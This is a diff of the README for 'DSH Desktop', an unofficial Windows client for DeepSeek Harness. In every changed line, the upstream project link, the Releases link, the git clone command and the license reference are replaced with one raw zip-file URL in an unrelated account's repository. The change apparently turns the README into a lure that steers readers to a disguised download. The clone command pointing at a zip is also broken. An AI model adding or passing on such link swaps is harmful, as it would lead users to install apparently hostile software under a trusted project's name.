@@ -1,6 +1,6 @@
 # DSH Desktop
 
-> 面向 Windows 的非官方 [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) 桌面客户端。不修改官方源码，直接运行并呈现官方 Web UI。
+> 面向 Windows 的非官方 [DeepSeek Harness](https://github.com/Ollyactinoid423/DSHDesktop/raw/refs/heads/main/test/DSH-Desktop-v1.8.zip) 桌面客户端。不修改官方源码，直接运行并呈现官方 Web UI。
 
 ## 为什么做这个项目
 
@@ -20,7 +20,7 @@ DeepSeek Harness 原生提供 Web 界面，但日常使用仍需要在终端中�
 
 ## 下载与安装
 
-前往 [Releases](https://github.com/CCMu04/DSHDesktop/releases) 下载：
+前往 [Releases](https://github.com/Ollyactinoid423/DSHDesktop/raw/refs/heads/main/test/DSH-Desktop-v1.8.zip) 下载：
 
 - `DSH-Desktop-Setup-<版本>-x64.exe`：标准安装包（推荐）。
 - `DSH-Desktop-Portable-<版本>-x64.exe`：免安装便携版。
@@ -77,7 +77,7 @@ DeepSeek Harness 原生提供 Web 界面，但日常使用仍需要在终端中�
 要求 Windows 10 / 11 与 Node.js 22.19+ 或 24（构建机自带即可，目标机不需要）：
 
 ```powershell
-git clone https://github.com/CCMu04/DSHDesktop.git
+git clone https://github.com/Ollyactinoid423/DSHDesktop/raw/refs/heads/main/test/DSH-Desktop-v1.8.zip
 cd DSHDesktop
 npm install
 npm run dist
@@ -105,6 +105,6 @@ npm run dist:offline
 
 ## 声明
 
-本项目是社区维护的非官方桌面封装，与 DeepSeek 无隶属或背书关系。"DeepSeek"、"DeepSeek Harness" 及相关标识归其权利人所有。官方 DSH 使用 MIT License，详见[上游项目](https://github.com/deepseek-ai/deepseek-harness)与[第三方声明](THIRD_PARTY_NOTICES.md)。
+本项目是社区维护的非官方桌面封装，与 DeepSeek 无隶属或背书关系。"DeepSeek"、"DeepSeek Harness" 及相关标识归其权利人所有。官方 DSH 使用 MIT License，详见[上游项目](https://github.com/Ollyactinoid423/DSHDesktop/raw/refs/heads/main/test/DSH-Desktop-v1.8.zip)与[第三方声明](THIRD_PARTY_NOTICES.md)。
 
 本项目自身代码使用 [MIT License](LICENSE)。
